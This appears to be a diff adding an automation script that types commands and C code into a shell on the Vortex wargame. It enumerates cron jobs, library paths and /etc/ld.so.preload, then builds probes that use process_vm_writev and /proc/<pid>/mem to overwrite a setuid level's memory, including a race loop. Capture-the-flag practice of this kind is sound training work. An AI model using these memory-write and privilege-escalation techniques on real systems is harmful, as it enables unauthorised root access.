@@ -1,0 +1,142 @@
+@sleep 3
+@wait 12 D=$(mktemp -d); cd $D; pwd
+@wait 8 echo "--- angle 1: cron contents ---"
+@wait 8 cat /etc/cron.d/clean_tmp
+@wait 6 cat /etc/cron.d/behemoth4_cleanup 2>&1
+@wait 8 cat /etc/cron.d/cronjob_bandit22 2>&1 | head -2
+@wait 6 cat /etc/cron.d/cronjob_bandit23 2>&1 | head -2
+@wait 6 cat /etc/cron.d/cronjob_bandit24 2>&1 | head -2
+@wait 8 ls -la /usr/bin/cronjob_bandit22.sh 2>&1
+@wait 8 echo "--- angle 2: trusted library dirs ---"
+@wait 6 cat /etc/ld.so.conf
+@wait 8 cat /etc/ld.so.conf.d/*.conf 2>/dev/null | head -6
+@wait 6 ls -la /etc/ld.so.preload 2>&1
+@wait 10 for d in /usr/lib/x86_64-linux-gnu /usr/lib32 /usr/local/lib /usr/local/lib/x86_64-linux-gnu /lib32 /lib /usr/lib; do [ -d $d ] && echo "$d $(test -w $d && echo WRITABLE || echo ro)"; done
+@wait 6 touch /usr/local/lib/vx13probe 2>&1 | head -1
+@wait 8 echo "--- angle 3: process_vm + /proc/mem (typed in vim) ---"
+@wait 6 mkdir -p /tmp/vx13p && echo ready
+@wait 6 vi pvm13.c
+@sleep 3
+@literal :set paste noai nosi nocindent\r
+@literal i
+@line #define _GNU_SOURCE
+@line #include <stdio.h>
+@line #include <stdlib.h>
+@line #include <string.h>
+@line #include <unistd.h>
+@line #include <sys/uio.h>
+@line #include <fcntl.h>
+@line #include <errno.h>
+@line #include <signal.h>
+@line #include <sys/wait.h>
+@line /* pvm13: test process_vm_readv/writev and /proc/<pid>/mem against a
+@line    parked setuid child (the L12 level parked in safecode's loop).
+@line    Same posture as the ptrace test: the child is setuid (fsuid 5012),
+@line    the parent (vortex13) attempts the access. */
+@line int main(int argc, char **argv) {
+@line     static char buf[16384];
+@line     FILE *f = fopen(argv[1], "r");
+@line     if (!f) return 2;
+@line     size_t n = fread(buf, 1, sizeof buf - 1, f);
+@line     fclose(f);
+@line     buf[n] = 0;
+@line     pid_t pid = fork();
+@line     if (pid == 0) {
+@line         sleep(1);
+@line         char *av[] = { "/vortex/vortex12", buf, 0 };
+@line         execv("/vortex/vortex12", av);
+@line         _exit(127);
+@line     }
+@line     sleep(3);                        /* the level parks */
+@line     /* process_vm_readv: read the parking loop's code area */
+@line     char rbuf[16];
+@line     struct iovec local = { rbuf, sizeof rbuf };
+@line     struct iovec remote = { (void *)0x08049260, sizeof rbuf };
+@line     errno = 0;
+@line     ssize_t r = process_vm_readv(pid, &local, 1, &remote, 1, 0);
+@line     printf("process_vm_readv: %zd errno=%s\n", r, strerror(errno));
+@line     /* process_vm_writev: write 4 bytes to the .bss scratch */
+@line     char wbuf[4] = { 0x41, 0x41, 0x41, 0x41 };
+@line     struct iovec l2 = { wbuf, 4 };
+@line     struct iovec r2 = { (void *)0x0804c028, 4 };
+@line     errno = 0;
+@line     r = process_vm_writev(pid, &l2, 1, &r2, 1, 0);
+@line     printf("process_vm_writev: %zd errno=%s\n", r, strerror(errno));
+@line     /* /proc/<pid>/mem write */
+@line     char mpath[64];
+@line     snprintf(mpath, sizeof mpath, "/proc/%d/mem", pid);
+@line     errno = 0;
+@line     int fd = open(mpath, O_RDWR);
+@line     printf("/proc/%d/mem open O_RDWR: %d errno=%s\n", pid, fd, strerror(errno));
+@line     if (fd >= 0) {
+@line         errno = 0;
+@line         ssize_t w = pwrite(fd, wbuf, 4, (off_t)0x0804c028);
+@line         printf("  pwrite: %zd errno=%s\n", w, strerror(errno));
+@line         close(fd);
+@line     }
+@line     kill(pid, 9);
+@line     waitpid(pid, 0, 0);
+@line     return 0;
+@line }
+@literal \x1b
+@literal :wq\r
+@wait 12 gcc -o pvm13 pvm13.c
+@wait 10 ./pvm13 /tmp/vx13p/park5.bin
+@wait 6 vi rw13.c
+@sleep 3
+@literal :set paste noai nosi nocindent\r
+@literal i
+@line #define _GNU_SOURCE
+@line #include <stdio.h>
+@line #include <stdlib.h>
+@line #include <string.h>
+@line #include <unistd.h>
+@line #include <sys/uio.h>
+@line #include <fcntl.h>
+@line #include <errno.h>
+@line #include <signal.h>
+@line #include <sys/wait.h>
+@line /* rw13: measure whether process_vm_writev can land between the L13
+@line    level's exec and its exit at the argc gate.  Spawns the level with
+@line    argv={NULL}, writes 4 bytes to the .bss scratch (0x804c028) in a
+@line    tight loop per spawn, counts the successes.  A success means the
+@line    post-exec window is writable: the argc-slot rewrite becomes
+@line    possible. */
+@line int main(void) {
+@line     int tries = 0, ok = 0, eperm = 0, esrch = 0;
+@line     for (int run = 0; run < 20; run++) {
+@line         pid_t pid = fork();
+@line         if (pid == 0) {
+@line             char *av[2] = { NULL, NULL };
+@line             char *ev[1] = { NULL };
+@line             execv("/vortex/vortex13", av);
+@line             _exit(127);
+@line         }
+@line         tries++;
+@line         char wbuf[4] = { 0x41, 0x41, 0x41, 0x41 };
+@line         struct iovec l = { wbuf, 4 };
+@line         struct iovec r = { (void *)0x0804c028, 4 };
+@line         /* tight write loop while the level lives */
+@line         for (;;) {
+@line             errno = 0;
+@line             ssize_t w = process_vm_writev(pid, &l, 1, &r, 1, 0);
+@line             if (w == 4) { ok++; break; }
+@line             if (errno == EPERM) { eperm++; break; }
+@line             int st;
+@line             pid_t w2 = waitpid(pid, &st, WNOHANG);
+@line             if (w2 == pid) { esrch++; break; }
+@line             if (w2 < 0) break;
+@line         }
+@line         kill(pid, 9);
+@line         waitpid(pid, 0, 0);
+@line     }
+@line     printf("spawns=%d writes-ok=%d eperm=%d exits=%d\n",
+@line            tries, ok, eperm, esrch);
+@line     return 0;
+@line }
+@literal \x1b
+@literal :wq\r
+@wait 12 gcc -o rw13 rw13.c
+@wait 14 nohup ./rw13 > rw13out.txt 2>&1 < /dev/null & sleep 8; cat rw13out.txt
+@wait 8 echo "--- angle 4: userland-exec family closed by the setuid-loss point ---"
+@wait 8 exit
